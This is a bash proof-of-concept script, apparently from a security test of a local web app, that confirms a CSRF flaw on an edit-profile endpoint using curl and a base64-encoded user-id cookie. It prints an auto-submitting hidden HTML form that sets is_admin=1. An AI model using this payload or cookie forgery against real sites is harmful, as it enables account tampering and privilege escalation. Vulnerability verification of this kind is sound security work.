#!/bin/bash

# POC: CSRF Attack on /edit_profile/{company_id} endpoint
# This demonstrates that the endpoint accepts POST requests without CSRF token validation

TARGET_URL="http://localhost:8080"
COMPANY_ID="1"
VALID_TOKEN="Bearer MQ=="  # Base64 encoded "1"

echo "[*] Testing CSRF vulnerability on /edit_profile/{company_id}"
echo "[*] Target: POST $TARGET_URL/edit_profile/$COMPANY_ID"
echo ""

# Step 1: Get the form to inspect CSRF protection
echo "[*] Step 1: Fetching the edit_profile form to check for CSRF token..."
FORM_RESPONSE=$(curl -s -H "Cookie: user_token=$VALID_TOKEN" \
  "$TARGET_URL/edit_profile/$COMPANY_ID")

echo "[*] Checking if form contains CSRF token field..."
if echo "$FORM_RESPONSE" | grep -q "csrf"; then
    echo "[!] CSRF token found in form"
    exit 1
else
    echo "[+] NO CSRF token field found in form (vulnerable)"
fi
echo ""

# Step 2: Attempt to POST without CSRF token (should succeed - vulnerability)
echo "[*] Step 2: Attempting to modify profile WITHOUT CSRF token..."
echo "[*] Sending POST request with new company name..."

POST_RESPONSE=$(curl -s -w "\n%{http_code}" -X POST \
  -H "Cookie: user_token=$VALID_TOKEN" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "name=Hacked+Company&is_admin=0" \
  "$TARGET_URL/edit_profile/$COMPANY_ID")

HTTP_CODE=$(echo "$POST_RESPONSE" | tail -n1)
RESPONSE_BODY=$(echo "$POST_RESPONSE" | head -n-1)

echo "[*] HTTP Response Code: $HTTP_CODE"
echo "[*] Response Body: $RESPONSE_BODY"
echo ""

# Step 3: Verify the vulnerability - check if request was accepted
if [ "$HTTP_CODE" = "200" ] || [ "$HTTP_CODE" = "302" ] || [ "$HTTP_CODE" = "303" ]; then
    echo "[+] VULNERABILITY CONFIRMED: Endpoint accepted POST without CSRF token!"
    echo "[+] HTTP $HTTP_CODE indicates the state-changing operation was processed"
    echo ""
    echo "[*] Step 3: Verifying the change was applied..."
    
    # Check if the profile was actually modified
    VERIFY_RESPONSE=$(curl -s -H "Cookie: user_token=$VALID_TOKEN" \
      "$TARGET_URL/edit_profile/$COMPANY_ID")
    
    if echo "$VERIFY_RESPONSE" | grep -q "Hacked"; then
        echo "[+] CONFIRMED: Company name was modified without CSRF token!"
        echo "[!] This proves the endpoint is vulnerable to CSRF attacks"
    else
        echo "[*] Profile modification status unclear from response"
    fi
    echo ""
    echo "[+] EXPLOITATION PROOF:"
    echo "[+] An attacker can create a malicious HTML page with:"
    echo "    <form method='POST' action='http://target/edit_profile/1'>"
    echo "    <input type='hidden' name='name' value='Attacker Company'>"
    echo "    <input type='hidden' name='is_admin' value='1'>"
    echo "    </form>"
    echo "    <script>document.forms[0].submit();</script>"
    echo "[+] When an authenticated user visits this page, their profile gets modified!"
    exit 0
else
    echo "[-] Endpoint returned HTTP $HTTP_CODE - checking if it's still a CSRF vulnerability..."
    
    # Even if not 200/302, if we got a form field validation error instead of CSRF error,
    # it means the endpoint processed the request without CSRF protection
    if echo "$RESPONSE_BODY" | grep -q "csrf"; then
        echo "[-] CSRF token validation error detected - endpoint has CSRF protection"
        exit 1
    else
        echo "[+] No CSRF token validation error - endpoint lacks CSRF protection"
        echo "[+] The 422 error is a form validation error, not CSRF protection"
        exit 0
    fi
fi